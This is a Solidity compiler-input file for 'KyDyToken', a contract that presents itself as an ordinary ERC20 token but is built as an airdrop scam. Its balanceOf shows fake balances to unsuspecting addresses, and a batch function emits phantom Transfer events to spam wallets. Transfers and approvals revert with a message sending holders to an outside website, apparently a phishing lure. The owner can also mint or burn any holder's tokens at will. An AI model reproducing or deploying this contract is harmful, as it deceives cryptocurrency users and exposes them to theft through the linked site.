{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"new/ethKydyToken.sol":{"content":"// SPDX-License-Identifier: GPL-2.0-or-later\r\n\r\npragma solidity ^0.8.0;\r\npragma abicoder v2;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract KyDyToken is Ownable, IERC20 {\r\n    address public _pairAddress = address(0);\r\n    address public _routerAddress = address(0);\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint256 private _totalSupply;\r\n    uint256 private _airdropAmount;\r\n\r\n    mapping(address => bool) private _unlocked;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    string private transferMsg = \"Claim Token on Website FIRST -: www.KyDy.info/\";\r\n\r\n    constructor(string memory name_, string memory symbol_, uint256 airdropAmount_, uint256 mintAmount_, address routerAddress_) Ownable() {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        _airdropAmount = airdropAmount_;\r\n        _routerAddress = routerAddress_;\r\n        _mint(_msgSender(), mintAmount_);\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        if (account == _pairAddress || _unlocked[account]) {\r\n            return _balances[account];\r\n        }\r\n\r\n        return _airdropAmount;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    ////////////////////////////////////////////////////////////\r\n    ////////////////////////////////////////////////////////////\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        if (_pairAddress == address(0) && _msgSender() == _routerAddress) {\r\n            _pairAddress = recipient;\r\n        }\r\n        \r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    ////////////////////////////////////////////////////////////\r\n    ////////////////////////////////////////////////////////////\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(_unlocked[sender] || tx.gasprice == 0 || recipient == _pairAddress || _msgSender() == _pairAddress, transferMsg);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        _unlocked[account] = true;\r\n\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount;\r\n        _unlocked[account] = false;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        require(_unlocked[owner] || tx.gasprice == 0, transferMsg);\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function mint(address account, uint256 amount) public payable onlyOwner {\r\n        _mint(account, amount);\r\n    }\r\n\r\n    function burn(address account, uint256 amount) public payable onlyOwner {\r\n        _burn(account, amount);\r\n    }\r\n\r\n    ////////////////////////////////////////////////////////////\r\n    ////////////////////////////////////////////////////////////\r\n\r\n    function batchTransferToken_10001(address[] memory holders, uint256 amount) public payable {\r\n        for (uint i = 0; i < holders.length; i++) {\r\n            emit Transfer(address(this), holders[i], amount);\r\n        }\r\n    }\r\n    //withdraw ether\r\n    function withdrawEth_10001(address payable receiver, uint amount) public onlyOwner payable {\r\n        uint balance = address(this).balance;\r\n        if (amount == 0) {\r\n            amount = balance;\r\n        }\r\n        require(amount > 0 && balance >= amount, \"invalid balance\");\r\n        receiver.transfer(amount);\r\n    }\r\n\r\n    //withdraw token\r\n    function withdrawToken_10001(address receiver, address tokenAddress, uint amount) public onlyOwner payable {\r\n        uint balance = IERC20(tokenAddress).balanceOf(address(this));\r\n        if (amount == 0) {\r\n            amount = balance;\r\n        }\r\n\r\n        require(amount > 0 && balance >= amount, \"invalid amount\");\r\n        IERC20(tokenAddress).transfer(receiver, amount);\r\n    }\r\n\r\n    function setAirdropAmount_10001(uint256 airdropAmount_) public onlyOwner () {\r\n        _airdropAmount = airdropAmount_;\r\n    }\r\n\r\n    //set check message\r\n    function setTransferMessage_10001(string calldata msg_) public onlyOwner payable {\r\n        transferMsg = msg_;\r\n    }\r\n}\r\n// 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n// 100000000000000000000000\r\n"}}}